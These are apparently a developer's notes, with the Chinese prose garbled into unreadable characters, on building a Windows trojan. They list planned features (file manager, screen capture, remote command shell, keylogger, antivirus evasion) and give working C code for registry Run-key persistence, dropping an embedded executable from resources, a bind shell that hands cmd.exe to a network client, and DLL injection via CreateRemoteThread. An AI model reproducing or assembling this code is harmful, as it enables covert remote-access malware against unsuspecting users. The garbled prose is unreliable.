# Ҫ��

1. �Ѽ��ܺ��b.dll�ŵ�a����
2. ��ȡ���ܲ��ֵ�����
3. ����
4. ִ�н��ܺ������



1.ľ����������������
2.ľ����
   �ļ���������
   screen dump����������������
   command shell��������
   keylog�����̼�¼����ѡ����
3.ľ����ɱ��ѡ����
4.ľ������
   �ļ���������
   ���̡�������
   �˿ڡ�ѡ����
   �����̡�ѡ����


# ����

## ������
ͨ������ע����ڿ�����ʱ��������

```c
#include <windows.h>
#include <stdio.h>

int main()
{

	HKEY hKey;
    DWORD result;

    //��ע���,�ǵ�˫б��ת��
    result = RegOpenKeyEx(
                 HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                 0,              // �������������� 0
                 KEY_WRITE,      // ��Ȩ�ޣ�д��
                 &hKey           // ��֮��ľ��
             );
 
    if (result == ERROR_SUCCESS)
    {
        printf("open success!\n");
    }
    else
    {
        printf("open failed!\n");
        exit(-1);
    }
	
	//��ȡ���������ļ���·��
	char szModuleName[MAX_PATH]={0};
    GetModuleFileName(NULL,szModuleName,MAX_PATH);
	printf("%s\n",szModuleName);
	
    // ���� NetworkAddress
    result = RegSetValueEx(
                 hKey,
                 "test",         // Name�ֶ�
                 0,              // �������������� 0
                 REG_SZ,         // ��ֵ����Ϊ�ַ���
                 (const unsigned char *)szModuleName, // �ַ����׵�ַ
                 strlen(szModuleName)   // �ַ�������
             );

    if (result == ERROR_SUCCESS)
    {
        printf("set success!\n");
    }
    else
    {
        printf("set failed!\n");
        exit(-2);
    }


	MessageBox(NULL,"test","test",0);


	return 0;

}
```







## ����Դ������ȡ����
˼·����ȡ��b.dll���ٰ�b.dllע���������̣�ʵ�ֽ������ء�
�����л�������ĵ�b.dll��


������VC6.0


![���������ͼƬ����](https://img-blog.csdnimg.cn/20191125212643432.png)

ѡ��import

����֮��
![���������ͼƬ����](https://img-blog.csdnimg.cn/20191125212719535.png)




�ο����ӣ�
��VC��ʹ���Զ�����Դ,FindResource,LoadResource,LockResource - �ɰ��� - ����԰
https://www.cnblogs.com/gakusei/articles/1352922.html



```c

int main()
{
	 //��λ���ǵ��Զ�����Դ��������Ϊ�����Ǵӱ�ģ�鶨λ��Դ�����Խ�����򵥵���ΪNULL����
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_HELLO1),  "hello"  );
	if (hRsrc == NULL)
	{
		printf("FindResource failed\n");
		DWORD ierr = GetLastError();
		showErrorText(ierr);
	 return 0;
	}

	//��ȡ��Դ�Ĵ�С
	DWORD dwSize = SizeofResource(NULL, hRsrc);
	if (0 == dwSize)
	{
		return -1;
	}
	printf("size of resource:%d\n",dwSize);


	HGLOBAL hGlobal  = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		printf("LoadResource failed\n");
		return -2;
	}
	
	//����ֵpBufferΪҪʹ�õ�ֱϵָ����Դ���ݵ��ڴ�ָ��
	LPVOID pBuffer = LockResource(hGlobal); 

	printf("%s\n",pBuffer);


	FILE* fp = fopen(".\\tmp100.exe", "wb");
	if (fp != NULL)
	{
		fwrite(pBuffer, dwSize, dwSize, fp);

	}
	fclose(fp);


	return 0;



}

/*
 * ���ݴ��������������Ϣ
 */
void showErrorText(DWORD error_num)
{
    char *msg = NULL;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error_num,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // ʹ��Ĭ������
        (LPSTR)&msg,
        0,
        NULL
    );
 
    printf("Error code %d: \n", error_num);
    if (msg == NULL)
    {
        printf("%s\n", "Unknown error");
	}
    else
    {
        printf("%s\n", msg);
	}
	
	system("pause"); 
}


```

## ��ͼ
�ο����ӣ�
ֻ�ҵ���C����ʵ�ֽ��� - ��Ҷ�� - ����԰
https://www.cnblogs.com/wwj973/p/9610774.html


##  command shell
�����ο�
```c


#define MasterPort 999  //��������˿�999
main()   //���������
{
  .................
  //��ȡcmd·��
  GetEnvironmentVariable("COMSPEC",szCMDPath,sizeof(szCMDPath));
  //����ws2_32.dll��
  WSAStartup(0x0202,&WSADa);
  //���ñ�����Ϣ�Ͱ�Э�飬����socket���������£�
  SockAddrIn.sin_family = AF_INET;
 .......
  //���ð󶨶˿�999��
  bind(CSocket,(sockaddr *)&SockAddrIn,sizeof(SockAddrIn));
  //���÷������˼����˿ڣ�
  listen(CSocket,1);
  iAddrSize = sizeof(SockAddrIn);
  //��ʼ����Զ�̷����������������ش��ڽṹ�壺
  SSocket = accept(CSocket,(sockaddr *)&SockAddrIn,&iAddrSize);
  ..........
  //���������ܵ���
  CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
.............
}

```


## ע��dll��ʵ�ֽ�������
�ο����ӣ�DLL ע�뼼���� N ������ - ֪��
https://zhuanlan.zhihu.com/p/28537697

��ʾע��ɹ������ǲ�����ִ��DllMain������֡�


```c
#include <windows.h>
#include <stdio.h>

int main()
{



	DWORD 	dwProcessId=1344;

	char pszLibFile[]="b.dll";
	DWORD dwSize = (lstrlenW((const unsigned short *)pszLibFile) + 1) * sizeof(wchar_t);



	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwProcessId);
	
	printf("hProcess:%p\n",hProcess);


	// ��Զ�̽�����Ϊ·�����Ʒ���ռ�
	LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	printf("pszLibFileRemote:%p\n",pszLibFileRemote);


	// ��DLL·�����Ƹ��Ƶ�Զ�̽��̵�ַ�ռ�
	DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);
	printf("n:%p\n",n);



	// ��ȡKernel32.dll�е�LoadLibraryW������������ַ
	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

	printf("pfnThreadRtn:%p\n",pfnThreadRtn);


	// ����Զ���̵߳���LoadLibraryW(DLLPathname)
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);
	
	if (hThread == NULL)
	{
		printf("%s\n","Error: Could not create the Remote Thread.\n");
		return(1);
	}else{
		printf("%s\n"," Success: DLL injected via CreateRemoteThread()");
	}
	

	return 0;

}

```

# δ�����
